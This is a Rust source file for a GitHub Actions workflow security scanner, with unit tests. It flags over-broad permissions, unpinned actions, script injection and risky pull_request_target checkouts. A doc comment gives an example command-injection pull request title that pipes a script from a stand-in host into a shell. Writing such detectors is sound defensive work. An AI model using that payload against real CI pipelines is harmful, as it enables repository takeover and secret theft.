//! The GitHub Actions workflow scanner.
//!
//! Workflow files are where the expensive mistakes live: a widened permission,
//! an unpinned third-party action, or untrusted text interpolated into a shell
//! all hand write access to whoever can open a pull request. None of it looks
//! dangerous in review, which is exactly why a deterministic check earns its
//! place here.
//!
//! Line-based rather than YAML-parsed, deliberately. A parser would need a
//! dependency in the default build, and every rule below is a property of a
//! single line. Where a rule genuinely needs file-level context — the
//! `pull_request_target` checkout pattern — the whole file's added lines are
//! considered together.

use crate::config::types::Severity;
use crate::scan::types::{Finding, ScanKind};

/// Action owners whose actions are first-party and may be tag-pinned.
///
/// Everyone else gets the SHA-pin rule: a tag is mutable, so `@v4` is a promise
/// the author of the action can break at any time, in your repository, with
/// your secrets in scope.
const TRUSTED_OWNERS: &[&str] = &["actions", "github", "tinyhumansai"];

/// Whether `path` is a workflow file.
pub fn is_workflow(path: &str) -> bool {
    path.starts_with(".github/workflows/") && (path.ends_with(".yml") || path.ends_with(".yaml"))
}

/// Scan one workflow file's added lines.
pub fn scan_added_lines<'a>(
    path: &str,
    added: impl Iterator<Item = (u64, &'a str)>,
) -> Vec<Finding> {
    if !is_workflow(path) {
        return Vec::new();
    }

    let lines: Vec<(u64, &str)> = added.collect();
    let mut findings = Vec::new();

    for (line_no, raw) in &lines {
        let text = raw.trim();

        if let Some(finding) = write_all_permissions(path, *line_no, text) {
            findings.push(finding);
        }
        if let Some(finding) = unpinned_action(path, *line_no, text) {
            findings.push(finding);
        }
        if let Some(finding) = secrets_inherit(path, *line_no, text) {
            findings.push(finding);
        }
    }

    findings.extend(script_injection(path, &lines));
    findings.extend(dangerous_target_checkout(path, &lines));

    findings
}

fn write_all_permissions(path: &str, line: u64, text: &str) -> Option<Finding> {
    let normalised = text.replace(' ', "");
    if !normalised.starts_with("permissions:write-all") {
        return None;
    }

    Some(
        Finding::new(
            ScanKind::Workflow,
            Severity::High,
            path,
            "workflow-write-all",
            "`permissions: write-all` grants the job every scope",
            "Grant only what the job uses, e.g. `contents: read` plus `checks: write`. A token \
             with every scope is a token worth stealing, and any action in the job can read it.",
        )
        .at_line(line),
    )
}

fn unpinned_action(path: &str, line: u64, text: &str) -> Option<Finding> {
    let reference = text.strip_prefix("- uses:").or_else(|| text.strip_prefix("uses:"))?;
    let reference = reference.trim().trim_matches(['"', '\'']);

    // Local (`./.github/actions/x`) and container (`docker://`) references are
    // not third-party tags.
    if reference.starts_with('.') || reference.starts_with("docker://") {
        return None;
    }

    let (action, version) = reference.split_once('@')?;
    let owner = action.split('/').next()?;

    if TRUSTED_OWNERS.contains(&owner) {
        return None;
    }
    if is_sha(version) {
        return None;
    }

    Some(
        Finding::new(
            ScanKind::Workflow,
            Severity::Medium,
            path,
            "unpinned-action",
            format!("`{action}` is pinned to `{version}`, which is mutable"),
            format!(
                "A tag or branch can be repointed by whoever owns `{owner}`, and the new code runs \
                 with this workflow's secrets. Pin to a full commit SHA and let Dependabot bump it."
            ),
        )
        .at_line(line),
    )
}

fn secrets_inherit(path: &str, line: u64, text: &str) -> Option<Finding> {
    if text.replace(' ', "") != "secrets:inherit" {
        return None;
    }

    Some(
        Finding::new(
            ScanKind::Workflow,
            Severity::Medium,
            path,
            "secrets-inherit",
            "`secrets: inherit` passes every secret to the called workflow",
            "Pass only the secrets the called workflow needs, by name.",
        )
        .at_line(line),
    )
}

/// Untrusted context interpolated directly into a `run:` block.
///
/// A pull request title of `"; curl evil.sh | sh; #` becomes shell when it is
/// substituted into a script. The fix is always the same: put it in an `env:`
/// variable and reference `"$VAR"`.
fn script_injection(path: &str, lines: &[(u64, &str)]) -> Vec<Finding> {
    const UNTRUSTED: &[&str] = &[
        "github.event.pull_request.title",
        "github.event.pull_request.body",
        "github.event.pull_request.head.ref",
        "github.event.issue.title",
        "github.event.issue.body",
        "github.event.comment.body",
        "github.event.review.body",
        "github.head_ref",
    ];

    let mut findings = Vec::new();
    let mut in_run_block = false;

    for (line_no, raw) in lines {
        let text = raw.trim();
        if text.starts_with("run:") {
            in_run_block = true;
        } else if text.starts_with("- ") || text.ends_with(':') && !text.contains("${{") {
            // A new key or list item ends the previous block scalar. Added-line
            // fragments make this approximate, which is why the finding is
            // phrased as something to check rather than something proven.
            in_run_block = text.starts_with("run:");
        }

        if !in_run_block || !text.contains("${{") {
            continue;
        }

        for expression in UNTRUSTED {
            if text.contains(expression) {
                findings.push(
                    Finding::new(
                        ScanKind::Workflow,
                        Severity::High,
                        path,
                        "script-injection",
                        format!("`{expression}` is interpolated into a shell command"),
                        "Anyone who can open a pull request controls this value, and it is \
                         substituted before the shell sees it. Bind it to an `env:` variable and \
                         reference it as \"$VAR\" so the shell treats it as data.",
                    )
                    .at_line(*line_no),
                );
                break;
            }
        }
    }

    findings
}

/// `pull_request_target` combined with a checkout of the pull request's head.
///
/// `pull_request_target` runs in the base repository's context: write token,
/// secrets, the lot. Checking out the contributor's code into that context and
/// then building or testing it hands the repository to the contributor. This is
/// the single most exploited GitHub Actions pattern, and it is why tinysweeper
/// itself never builds the code it reviews.
fn dangerous_target_checkout(path: &str, lines: &[(u64, &str)]) -> Vec<Finding> {
    let uses_target = lines
        .iter()
        .any(|(_, text)| text.contains("pull_request_target"));
    if !uses_target {
        return Vec::new();
    }

    lines
        .iter()
        .filter(|(_, text)| {
            let t = text.replace(' ', "");
            t.contains("ref:${{github.event.pull_request.head.sha}}")
                || t.contains("ref:${{github.event.pull_request.head.ref}}")
                || t.contains("ref:${{github.head_ref}}")
        })
        .map(|(line_no, _)| {
            Finding::new(
                ScanKind::Workflow,
                Severity::Critical,
                path,
                "pull-request-target-checkout",
                "`pull_request_target` checks out the contributor's code",
                "This workflow runs with the base repository's write token and secrets, and this \
                 step puts untrusted code inside it. If anything then builds, installs \
                 dependencies, or runs a script from that checkout, a pull request can take over \
                 the repository. Either drop to `pull_request`, or never execute anything from \
                 the checked-out tree.",
            )
            .at_line(*line_no)
        })
        .collect()
}

/// Whether a version reference is a full commit SHA.
fn is_sha(version: &str) -> bool {
    version.len() == 40 && version.chars().all(|c| c.is_ascii_hexdigit())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scan(lines: &[&str]) -> Vec<Finding> {
        let numbered: Vec<(u64, &str)> = lines
            .iter()
            .enumerate()
            .map(|(i, l)| (i as u64 + 1, *l))
            .collect();
        scan_added_lines(".github/workflows/ci.yml", numbered.into_iter())
    }

    #[test]
    fn only_workflow_paths_are_scanned() {
        assert!(is_workflow(".github/workflows/ci.yml"));
        assert!(is_workflow(".github/workflows/release.yaml"));
        assert!(!is_workflow("src/workflows/runner.rs"));
        assert!(!is_workflow(".github/dependabot.yml"));

        let findings = scan_added_lines(
            "src/main.rs",
            std::iter::once((1u64, "permissions: write-all")),
        );
        assert!(findings.is_empty());
    }

    #[test]
    fn write_all_permissions_are_flagged() {
        let findings = scan(&["permissions: write-all"]);
        assert_eq!(findings.len(), 1, "{findings:#?}");
        assert_eq!(findings[0].rule, "workflow-write-all");
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn scoped_permissions_are_fine() {
        assert!(scan(&["permissions:", "  contents: read", "  checks: write"]).is_empty());
    }

    #[test]
    fn a_third_party_action_on_a_mutable_tag_is_flagged() {
        let findings = scan(&["      - uses: some-vendor/deploy-action@v3"]);
        assert_eq!(findings.len(), 1, "{findings:#?}");
        assert_eq!(findings[0].rule, "unpinned-action");
        assert!(findings[0].detail.contains("some-vendor"));
    }

    #[test]
    fn a_sha_pinned_third_party_action_is_fine() {
        assert!(
            scan(&[
                "      - uses: some-vendor/deploy-action@1234567890abcdef1234567890abcdef12345678"
            ])
            .is_empty()
        );
    }

    #[test]
    fn first_party_actions_may_use_tags() {
        assert!(
            scan(&[
                "      - uses: actions/checkout@v5",
                "      - uses: github/codeql-action/init@v3",
            ])
            .is_empty()
        );
    }

    #[test]
    fn local_and_container_action_references_are_not_tags() {
        assert!(
            scan(&[
                "      - uses: ./.github/actions/setup",
                "      - uses: docker://alpine:3.20",
            ])
            .is_empty()
        );
    }

    #[test]
    fn untrusted_context_in_a_run_block_is_flagged() {
        let findings = scan(&[
            "      - run: |",
            "          echo \"Reviewing ${{ github.event.pull_request.title }}\"",
        ]);

        assert_eq!(findings.len(), 1, "{findings:#?}");
        assert_eq!(findings[0].rule, "script-injection");
        assert_eq!(findings[0].severity, Severity::High);
        assert!(findings[0].detail.contains("env:"));
    }

    #[test]
    fn trusted_context_in_a_run_block_is_left_alone() {
        assert!(
            scan(&[
                "      - run: echo \"${{ github.sha }} on ${{ github.repository }}\"",
            ])
            .is_empty()
        );
    }

    #[test]
    fn untrusted_context_outside_a_run_block_is_not_shell() {
        // Binding it to an env var is the *fix*, so flagging it there would be
        // telling people off for doing the right thing.
        assert!(
            scan(&[
                "        env:",
                "          TITLE: ${{ github.event.pull_request.title }}",
            ])
            .is_empty()
        );
    }

    #[test]
    fn pull_request_target_checking_out_head_is_critical() {
        let findings = scan(&[
            "on:",
            "  pull_request_target:",
            "      - uses: actions/checkout@v5",
            "        with:",
            "          ref: ${{ github.event.pull_request.head.sha }}",
        ]);

        let injection: Vec<_> = findings
            .iter()
            .filter(|f| f.rule == "pull-request-target-checkout")
            .collect();
        assert_eq!(injection.len(), 1, "{findings:#?}");
        assert_eq!(injection[0].severity, Severity::Critical);
    }

    #[test]
    fn pull_request_target_without_a_head_checkout_is_allowed() {
        // This is exactly how tinysweeper's own action has to run to review
        // fork pull requests, so flagging it would condemn the tool itself.
        let findings = scan(&[
            "on:",
            "  pull_request_target:",
            "      - uses: actions/checkout@v5",
        ]);
        assert!(
            !findings
                .iter()
                .any(|f| f.rule == "pull-request-target-checkout"),
            "{findings:#?}"
        );
    }

    #[test]
    fn a_head_checkout_under_plain_pull_request_is_not_flagged() {
        let findings = scan(&[
            "on:",
            "  pull_request:",
            "          ref: ${{ github.event.pull_request.head.sha }}",
        ]);
        assert!(
            !findings
                .iter()
                .any(|f| f.rule == "pull-request-target-checkout"),
            "{findings:#?}"
        );
    }

    #[test]
    fn secrets_inherit_is_flagged() {
        let findings = scan(&["    secrets: inherit"]);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule, "secrets-inherit");
    }

    #[test]
    fn a_clean_workflow_produces_nothing() {
        assert!(
            scan(&[
                "name: CI",
                "on:",
                "  pull_request:",
                "permissions:",
                "  contents: read",
                "jobs:",
                "  test:",
                "    runs-on: ubuntu-latest",
                "    steps:",
                "      - uses: actions/checkout@v5",
                "      - run: cargo test --locked",
            ])
            .is_empty()
        );
    }

    #[test]
    fn sha_detection_requires_a_full_length_hex_string() {
        assert!(is_sha("1234567890abcdef1234567890abcdef12345678"));
        assert!(!is_sha("1234567"), "abbreviated SHAs are still mutable-ish");
        assert!(!is_sha("v4"));
        assert!(!is_sha("main"));
    }
}
